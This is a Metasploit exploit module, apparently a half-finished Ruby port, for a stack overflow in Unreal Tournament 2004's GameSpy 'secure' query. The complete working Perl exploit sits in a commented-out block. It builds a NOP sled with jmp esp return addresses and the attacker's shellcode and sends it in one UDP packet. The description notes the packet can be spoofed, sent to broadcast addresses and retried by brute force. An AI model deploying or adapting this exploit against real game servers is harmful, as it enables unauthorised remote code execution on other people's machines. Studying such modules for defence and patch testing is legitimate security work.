require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Unreal Tournament 2004 "secure" Overflow (Win32)',
			'Description'    => %q{
				
				      This is an exploit for the GameSpy secure query in
				the Unreal Engine.

				      This exploit only requires one UDP packet, which can
				be both spoofed
				      and sent to a broadcast address.
				Usually, the GameSpy query server listens
				      on port
				7787, but you can manually specify the port as well.

				      The RunServer.sh script will automatically restart the
				server upon a crash, giving
				      us the ability to
				bruteforce the service and exploit it multiple
				      times. 
					
			},
			'Author'         => [ 'Stinko' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '7217'],
					[ 'BID', '10570'],
					[ 'MIL', '73'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x5c\x00",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 18 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ut2004_secure_win32;
use base "Msf::Exploit";
use strict;

my $advanced = { };
my $info =
  {
	'Name'  => 'Unreal Tournament 2004 "secure" Overflow (Win32)',
	'Version'  => '$Revision$',
	'Authors' => [ 'Stinko', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 7787],
	  },
	'Payload' =>
	  {
		'Space'     => 512,
		'BadChars'  => "\x5c\x00",
	  },

	'Description'  =>  qq{
      This is an exploit for the GameSpy secure query in the Unreal Engine.

      This exploit only requires one UDP packet, which can be both spoofed
      and sent to a broadcast address. Usually, the GameSpy query server listens
      on port 7787, but you can manually specify the port as well.

      The RunServer.sh script will automatically restart the server upon a crash, giving
      us the ability to bruteforce the service and exploit it multiple
      times. 
},

	'Refs'  =>
	  [
		['OSVDB', '7217'],
		['BID', '10570'],
		['MIL', '73'],
	  ],

	'Targets' =>
	  [
		['UT2004 Build 3186', 0x10184be3, 0x7ffdf0e4], # jmp esp
	  ],

	'Keys'  => ['unreal2004'],

	'DisclosureDate' => 'Jun 18 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $request = $self->MakeNops(1024);
	substr($request, 0, 60, pack("V", $target->[1]) x 15);

	substr($request, 56, 4, pack("V", $target->[2]));
	substr($request, 0, length("\\secure\\"), "\\secure\\");
	substr($request, length($request) - length($shellcode), length($shellcode), $shellcode);

	my $sock = Msf::Socket::Udp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
	  );
	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	$self->PrintLine('[*] Sending UDP Secure Request (Dest Port: ' . $target_port . ') (' . length($request) . ' bytes)');

	if(!$sock->Send($request)) {
		$sock->PrintError;
		return;
	}

	return;
}

sub Check
{
	my $self = shift();
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $versionNum  = $self->GetVersion($target_host, $target_port);

	if(! $versionNum) {
		$self->PrintLine("[*] Couldn't detect Unreal Tournament Server at ". $target_host . ':' . $target_port);
		return $self->CheckCode('Generic');
	}
	else {
		$self->PrintLine('[*] Detected Unreal Tournament Server Version: ' . $versionNum . ' at ' . $target_host . ':' . $target_port);
		if ($versionNum =~ /^(3120|3186|3204)$/) {
			$self->PrintLine("[*] The server is more than likely exploitable");
			return $self->CheckCode('Appears');
		}
		elsif ($versionNum =~ /^(2...)$/) {
			$self->PrintLine("[*] The server appears to be running UT2003");
			return $self->CheckCode('Safe');
		}

		$self->PrintLine("[*] The server is more than likely patched");
		return $self->CheckCode('Safe');
	}
}

sub GetVersion
{
	my $self = shift();
	my $target_host = shift();
	my $target_port = shift();

	my $s = Msf::Socket::Udp->new
	  (
		PeerAddr => $target_host,
		PeerPort => $target_port,
	  );

	if($s->IsError()) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine('[*] Sending UDP Version Request to ' . $target_host . ':' . $target_port);

	my $versionRequest = "\\basic\\";
	if(!$s->Send($versionRequest)) {
		$s->PrintError;
		return;
	}

	my $versionReply = $s->Recv(-1, 10);
	my $versionNum;

	if ($versionReply =~ m/\\gamever\\([0-9]{1,5})/) {
		$versionNum = $1;
	}

	return $versionNum;
}

1;

=end


end
end	
